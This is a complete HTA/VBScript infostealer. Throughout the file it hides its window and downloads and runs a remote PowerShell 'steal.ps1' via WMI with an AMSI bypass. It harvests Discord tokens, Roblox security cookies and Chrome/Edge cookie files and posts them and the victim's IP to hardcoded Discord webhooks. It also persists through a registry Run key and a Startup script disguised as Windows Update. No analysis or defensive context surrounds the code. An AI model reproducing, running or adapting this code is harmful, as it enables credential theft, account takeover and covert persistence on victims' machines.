<html>
<head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
<script language="VBScript">
window.resizeTo 0,0:window.moveTo -2000,-2000
On Error Resume Next

Dim sh, fso, WH_ALL, RE_WH, PAYLOAD_URL, PC, USER
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' --- WEBHOOKS ---
WH_ALL = "https://discord.com/api/webhooks/1570948488827768965/iy7doGW9BXfi_b5dBRZlZ-CQNNBtKu72De2bXYFPRo32-Kj97nK8YzOy5SZMv2e8-Uqa"
RE_WH = "https://discord.com/api/webhooks/1570948618209329283/PzkNhyMFSipBVaU6MLG5cMr3bQrJCQhGVAqmKuBiWhekJTWAXERsrHl7Y0VUmU1scadn"

PAYLOAD_URL = "mshta https://dicerigx.app/"

PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
USER = sh.ExpandEnvironmentStrings("%USERNAME%")

' --- Initial Grab ---
Call GrabTokens(True)
Call IP(True)
Call GrabRoblox(True)
Call Persistence(True)

' --- Re-run grab chain (every 1 min) ---
Dim runCount
For runCount = 1 To 4
    Call PostEmbedTo(":repeat: Re-grab " & runCount & "/4", "PC: " & PC & " | User: " & USER, 3447003, RE_WH)
    Call GrabTokens(False)
    Call IP(False)
    Call GrabRoblox(False)
    If runCount < 4 Then Call SleepMinutes(1)
Next

' --- WAIT AND CLOSE ---
Call SleepSeconds(10)
window.close()

' --- GrabTokens (In-Memory + WMI + AMSI Bypass) ---
Sub GrabTokens(isFirstGrab)
    Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.Open "GET", "https://gist.githubusercontent.com/iveshahaha/bb5e511a627ff1ce80ccc4839153f901/raw/steal.ps1", False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim pc: pc = xh.responseText
    Set xh = Nothing
    
    ' 1. Base64 Encode Stealer
    Dim b64Script : b64Script = Base64Encode(pc)
    
    ' 2. AMSI Bypass
    Dim amsi : amsi = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);"
    Dim b64Amsi : b64Amsi = Base64Encode(amsi)
    
    ' 3. Construct Command
    Dim finalCmd : finalCmd = "powershell -NoP -Exec Bypass -WindowStyle Hidden -EncodedCommand " & b64Amsi & " -Command ""IEX ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('" & b64Script & "')))"""
    
    ' 4. Spawn via WMI (Bypasses process monitoring)
    Dim wmi: Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    Dim proc: Set proc = wmi.Get("Win32_Process")
    proc.Create finalCmd, Null, Null
    
    ' 5. Wait for execution
    Dim w: w = Timer()
    Do While Timer() - w < 6
    Loop
    
    ' 6. Read Results
    Dim tf: tf = TmpFile("steal_result.txt")
    If Not fso.FileExists(tf) Then Exit Sub
    Dim raw: raw = ReadFile(tf)
    
    If Len(raw) > 10 Then
        Dim lines: lines = Split(raw, vbCrLf)
        Dim l
        For Each l In lines
            If Len(l) > 10 Then
                If Left(l, 8) = "DISCORD|" Then
                    Dim p: p = Split(Mid(l, 9), "|")
                    If UBound(p) >= 4 Then
                        Dim info: info = "**Token:** " & p(4)
                        If isFirstGrab Then
                            Call PostEmbedTo(":gift: Discord Token", info, 5793266, WH_ALL)
                        Else
                            Call PostEmbedTo(":gift: Discord Token", info, 5793266, RE_WH)
                        End If
                    End If
                End If
            End If
        Next
    End If
End Sub

' --- Base64 Encode Helper ---
Function Base64Encode(sText)
    Dim oXML, oNode
    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.nodeTypedValue = Stream_StringToBinary(sText)
    Base64Encode = oNode.text
End Function

Function Stream_StringToBinary(Text)
    Dim BinaryStream
    Set BinaryStream = CreateObject("ADODB.Stream")
    BinaryStream.Type = 2
    BinaryStream.Charset = "unicode"
    BinaryStream.Open
    BinaryStream.WriteText Text
    BinaryStream.Position = 0
    BinaryStream.Type = 1
    Stream_StringToBinary = BinaryStream.Read
    BinaryStream.Close
End Function

' --- GrabRoblox Function ---
Sub GrabRoblox(isFirstGrab)
    Dim paths(9)
    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
    paths(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
    paths(3) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
    paths(4) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
    paths(5) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Network\Cookies"
    paths(6) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Google\Chrome\User Data\Default\Network\Cookies"
    paths(7) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Edge\User Data\Default\Network\Cookies"
    paths(8) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\leveldb"
    paths(9) = ""

    Dim i, fp
    For i = 0 To 8
        If fso.FileExists(paths(i)) Then fp = paths(i) : Exit For
        If fso.FolderExists(paths(i)) Then fp = paths(i) : Exit For
    Next

    If Len(fp) = 0 Then Exit Sub
    Dim cookie: cookie = RawRobloxCookie(fp)
    If Len(cookie) < 50 Then Exit Sub

    If isFirstGrab Then
        Call PostEmbedTo(":cookie: Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC, 65280, WH_ALL)
        Call PostFileTo("cookie.txt", cookie, WH_ALL)
    Else
        Call PostEmbedTo(":cookie: Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC, 65280, RE_WH)
        Call PostFileTo("cookie.txt", cookie, RE_WH)
    End If
End Sub

Function RawRobloxCookie(fp)
    RawRobloxCookie = ""
    If fso.FolderExists(fp) Then
        Dim f, raw
        For Each f In fso.GetFolder(fp).Files
            If Right(LCase(f.Name), 4) = ".ldb" Or Right(LCase(f.Name), 4) = ".log" Then
                raw = ReadBinaryAsText(f.Path)
                Dim ck: ck = ExtractRaw(raw)
                If Len(ck) > 50 Then RawRobloxCookie = ck : Exit Function
            End If
        Next
        Exit Function
    End If
    raw = ReadBinaryAsText(fp)
    RawRobloxCookie = ExtractRaw(raw)
End Function

Function ExtractRaw(s)
    ExtractRaw = ""
    Dim p: p = InStr(s, "_|WARNING")
    If p = 0 Then p = InStr(s, ".ROBLOSECURITY")
    If p = 0 Then Exit Function
    Dim rest: rest = Mid(s, p)
    Dim stopAt: stopAt = InStr(rest, ";")
    Dim nulAt: nulAt = InStr(rest, Chr(0))
    If nulAt > 0 And (stopAt = 0 Or nulAt < stopAt) Then stopAt = nulAt
    If stopAt = 0 Then stopAt = Len(rest)
    Dim ck: ck = Left(rest, stopAt - 1)
    ExtractRaw = Trim(Replace(ck, vbCr, ""))
End Function

Function ReadBinaryAsText(path)
    ReadBinaryAsText = ""
    Dim st: Set st = CreateObject("ADODB.Stream")
    st.Type = 1
    st.Open
    st.LoadFromFile path
    Dim bytes: bytes = st.Read
    st.Close
    Dim sb, i, b
    sb = ""
    For i = 1 To LenB(bytes)
        b = AscB(MidB(bytes, i, 1))
        If b >= 32 And b <= 126 Then sb = sb & Chr(b)
    Next
    ReadBinaryAsText = sb
End Function

' --- IP, Persistence, Utils ---
Sub IP(isFirstGrab)
    Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.Open "GET", "https://api.ipify.org/", False
    xh.Send
    If xh.Status = 200 Then
        Dim info : info = "IP: " & xh.responseText & " | PC: " & PC
        If isFirstGrab Then
            Call PostEmbedTo(":dart: Target", info, 3447003, WH_ALL)
        Else
            Call PostEmbedTo(":dart: Target", info, 3447003, RE_WH)
        End If
    End If
End Sub

Sub Persistence(isFirstGrab)
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", PAYLOAD_URL, "REG_SZ"
    Dim sp : sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
    Dim sf : Set sf = fso.CreateTextFile(sp, True)
    sf.WriteLine "CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)).Run Chr(34)&""" & PAYLOAD_URL & """&Chr(34), 0, False"
    sf.Close
End Sub

Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
Sub WriteFile(path, content): Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: End Function
Function ReadFile(path): ReadFile = "": Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: End Function

Sub SleepSeconds(s)
    Dim cmd : cmd = "cmd /c ping -n " & (s + 1) & " 127.0.0.1 > nul"
    sh.Run cmd, 0, True
End Sub
Sub SleepMinutes(m)
    Call SleepSeconds(m * 60)
End Sub

Sub PostEmbedTo(t, d, c, target_wh)
    Dim DQ: DQ = Chr(34)
    Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & t & DQ & "," & DQ & "description" & DQ & ":" & DQ & d & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.Open "POST", target_wh, False
    h.SetRequestHeader "Content-Type", "application/json"
    h.Send j
End Sub

Sub PostFileTo(fn, ct, target_wh)
    Dim DQ: DQ = Chr(34)
    Dim b: b = Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 36)
    Dim bd: bd = "--" & b & vbCrLf & "Content-Disposition: form-data; name=" & DQ & "file" & DQ & "; filename=" & DQ & fn & DQ & vbCrLf & vbCrLf & ct & vbCrLf & "--" & b & "--"
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.Open "POST", target_wh, False
    h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b
    h.Send bd
End Sub
</script>
</head><body></body></html>
